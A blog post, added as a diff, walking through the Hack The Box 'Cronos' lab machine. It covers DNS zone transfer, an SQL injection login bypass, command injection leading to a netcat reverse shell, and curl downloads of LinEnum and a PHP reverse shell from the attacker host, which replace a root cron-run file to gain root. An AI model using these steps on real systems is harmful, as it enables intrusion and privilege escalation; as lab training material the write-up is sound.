@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Cronos - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Analytics -->
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Cronos"><a href="#Hack-The-Box-Cronos" class="headerlink" title="Hack The Box - Cronos"></a>Hack The Box - Cronos</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Cronos is a medium difficult target, focuses mainly on different vectors for enumeration and also emphasises the risks associated with adding world-writable files to the root crontab. This machine also includes an introductory-level SQL injection vulnerability. Its IP address is <code>10.10.10.13.</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/cronos/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/cronos)
+ |
+ |-->{SFire129}#nmap -A -v 10.10.10.13
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-20 14:29 EDT
+ NSE: Loaded 151 scripts for scanning.
+ NSE: Script Pre-scanning.
+ Nmap scan report for 10.10.10.13
+ Host is up (0.11s latency).
+ Not shown: 997 filtered ports
+ PORT   STATE SERVICE VERSION
+ 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+ | ssh-hostkey:
+ |   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
+ |   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
+ |_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
+ 53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
+ | dns-nsid:
+ |_  bind.version: 9.10.3-P4-Ubuntu
+ 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+ | http-methods:
+ |_  Supported Methods: GET HEAD POST OPTIONS
+ |_http-server-header: Apache/2.4.18 (Ubuntu)
+ |_http-title: Apache2 Ubuntu Default Page: It works
+ Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+ Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 4.8 (92%)
+ No exact OS matches for host (test conditions non-ideal).
+ Uptime guess: 198.839 days (since Sun Nov  3 17:21:26 2019)
+ Network Distance: 2 hops
+ TCP Sequence Prediction: Difficulty=262 (Good luck!)
+ IP ID Sequence Generation: All zeros
+ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+ TRACEROUTE (using port 80/tcp)
+ HOP RTT       ADDRESS
+ 1   108.91 ms 10.10.14.1
+ 2   109.06 ms 10.10.10.13
+ 
+ NSE: Script Post-scanning.
+ Initiating NSE at 14:30
+ Completed NSE at 14:30, 0.00s elapsed
+ Initiating NSE at 14:30
+ Completed NSE at 14:30, 0.00s elapsed
+ Initiating NSE at 14:30
+ Completed NSE at 14:30, 0.00s elapsed
+ Read data files from: /usr/bin/../share/nmap
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 32.33 seconds
+            Raw packets sent: 2084 (95.284KB) | Rcvd: 40 (2.448KB)<br></figure></pre
+<p>Browse to 80 port and view the service Apache.
+<br>
+<img src="/images/hackthebox/exploit/cronos/1.png" alt=""></p>
+<br>
+<p> The port 53/tcp is a domain service, which show cronos.htb domain tagged.
+<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/cronos)
+|
+|-->{SFire129}#nslookup
+> server 127.0.0.1
+Default server: 127.0.0.1
+Address: 127.0.0.1#53
+> server 10.10.10.13
+Default server: 10.10.10.13
+Address: 10.10.10.13#53
+> 10.10.10.13
+13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.</figure></pre>
+<br>
+<p> With <code>dig</code> can to find the subdomain with reverse query.
+<br> 
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/cronos)
+ |
+ |-->{SFire129}#dig axfr cronos.htb @10.10.10.13
+ 
+ ; <<>> DiG 9.16.2-Debian <<>> axfr cronos.htb @10.10.10.13
+ ;; global options: +cmd
+ cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+ cronos.htb.             604800  IN      NS      ns1.cronos.htb.
+ cronos.htb.             604800  IN      A       10.10.10.13
+ admin.cronos.htb.       604800  IN      A       10.10.10.13
+ ns1.cronos.htb.         604800  IN      A       10.10.10.13
+ www.cronos.htb.         604800  IN      A       10.10.10.13
+ cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+ ;; Query time: 112 msec
+ ;; SERVER: 10.10.10.13#53(10.10.10.13)
+ ;; WHEN: Wed May 20 14:44:55 EDT 2020
+ ;; XFR size: 7 records (messages 1, bytes 203)
+ 
+ |-------(root@kali)-------|(~/HackTheBox/cronos)
+ |
+ |-->{SFire129}</figure></pre>
+ <br>
+  <p>Edit the <code>/etc/hosts/</code> file, with the each one subdomain point to 10.10.10.13.
+ <img src="/images/hackthebox/exploit/cronos/2.png" alt=""></p>
+ <br>
+ <p>Open in the web browser the different subdomain found it.
+ <br>
+ <img src="/images/hackthebox/exploit/cronos/3.png" alt=""></p>
+ <br>
+ <img src="/images/hackthebox/exploit/cronos/4.png" alt=""></p>
+ <br>
+ <p>With the <code>sql injection</code>manual, try to bypass over admin page, in this case with <code>admin'-- -</code>.
+ <br>
+  <img src="/images/hackthebox/exploit/cronos/5.png" alt=""></p>
+
+<h2 id="Reverse Web Shell"><a href="#Reverse-Web-Shell" class="headerlink" title="Reverse Web Shell"></a>Reverse Web Shell</h2>
+<p> Launch Burp Suite and run the command ping from the admin page and send to repeater section.
+<br>
+<img src="/images/hackthebox/exploit/cronos/6.png" alt=""></p>
+<br>
+<p> Change the command sent to <code>whoami</code> and see the output.
+<br>
+<img src="/images/hackthebox/exploit/cronos/7.png" alt=""></p>
+<br>
+<p> In the link <a class="vglnk" http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"rel="nofollow"><span> Reverse Conection </span></a> search the script.
+<p>Run in kali linux <code>nc -nvlp 4447</code> and change the query in burp suite for reverse conection. Don´t forget change with <code>CTRL + u</code> command the url for encoded query.
+<br>
+<img src="/images/hackthebox/exploit/cronos/8.png" alt=""></p>
+<br>
+<p> Search the flag user.
+<pre><figure class="highlight plain">$ python -c 'import pty; pty.spawn("/bin/bash")'
+ www-data@cronos:/var/www/admin$ cd /home
+ cd /home
+ www-data@cronos:/home$ ls
+ ls
+ noulis
+ www-data@cronos:/home$ cd noulis
+ www-data@cronos:/home/noulis$ cat user.txt
+ cat user.txt
+ ***Here you could find the user flag***
+ www-data@cronos:/home/noulis$ </figure></pre>
+ <br>
+ <h2 id="Get-Privileges"><a href="#Get-Privilege" class="headerlink" title="Get Privilege"></a>Get Privileges</h2>
+ <p> Download in Kali linux <a class="vglnk"https://raw.githubusercontent.com/diegoexploit/LinEnum/master/LinEnum.sh"rel="nofollow"><span> LinuxEnumeration </span></a> script and run the http server.
+<br>
+<img src="/images/hackthebox/exploit/cronos/9.png" alt=""></p>
+<br>
+<p>From the NetCat session, get the <a class="vglnk"https://raw.githubusercontent.com/diegoexploit/LinEnum/master/LinEnum.sh"rel="nofollow"><span>LinEnum.sh</span></a> file. Prior to download, change to the original directory.
+ <pre><figure class="highlight plain">www-data@cronos:/home/noulis$ cd /var/www/admin
+cd /var/www/admin
+www-data@cronos:/var/www/admin$ curl 10.10.14.7:82/LinEnum.sh -o LinEnum.sh
+curl 10.10.14.7:82/LinEnum.sh -o LinEnum.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 46631  100 46631    0     0   107k      0 --:--:-- --:--:-- --:--:--  107k
+www-data@cronos:/var/www/admin$</figure></pre>
+<br>
+<p> Run the script to enumerate the system with <code>bash LinEnum.sh</code>.
+<br>
+<p>The script show us the crontab file run as root, which can be change for own file privileges.<br>
+<img src="/images/hackthebox/exploit/cronos/10.png" alt=""></p>
+<br>
+<p>Then in Kali linux, download the <a class="vglnk"http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz"rel="nofollow"><span>php-reverse-shell.php</span></a> and change the IP Address and port for reverse conection.
+<img src="/images/hackthebox/exploit/cronos/11.png" alt=""></p>
+<br>
+<p>Get the  <a class="vglnk"http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz"rel="nofollow"><span>php-reverse-shell.php</span></a> from http server Kali.
+<pre><figure class="highlight plain"> www-data@cronos:/var/www/admin$ curl  10.10.14.7:82/php-reverse-shell.php -o shell.php
+ min$ curl  10.10.14.7:82/php-reverse-shell.php -o shell.php
+   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                  Dload  Upload   Total   Spent    Left  Speed
+ 100  5492  100  5492    0     0  25568      0 --:--:-- --:--:-- --:--:-- 25663
+ www-data@cronos:/var/www/admin$</figure></pre>
+<br>
+<p> Delete the file <code>artisan</code> in <code>/var/www/laravel/</code> location and replace with php file downloaded.In the Kali linux run netcat with port 4446.
+<br>
+<pre><figure class="highlight plain"> www-data@cronos:/var/www/admin$ rm /var/www/laravel/artisan
+ rm /var/www/laravel/artisan
+ www-data@cronos:/var/www/admin$ mv shell.php /var/www/laravel/artisan
+ mv shell.php /var/www/laravel/artisan</figure></pre>
+ 
+<p>After one minute, the crontab run own php file, but send a reverse connecction to Kali linux
+<img src="/images/hackthebox/exploit/cronos/12.png" alt=""></p>
+ <br>
+  <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="headerlink" title="Capture the Flag"></a>Capture The Flag</h2>
+  <p>Capture de root flag.
+  <br>
+ <pre><figure class="highlight plain"> # python -c 'import pty; pty.spawn("/bin/bash")'
+ root@cronos:/# cd /root
+ root@cronos:~# cat root.txt
+ cat root.txt
+ ***Here you could be find the root flag***
+ root@cronos:~#
+   </figure></pre
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-20</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#capture-the-Flag</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
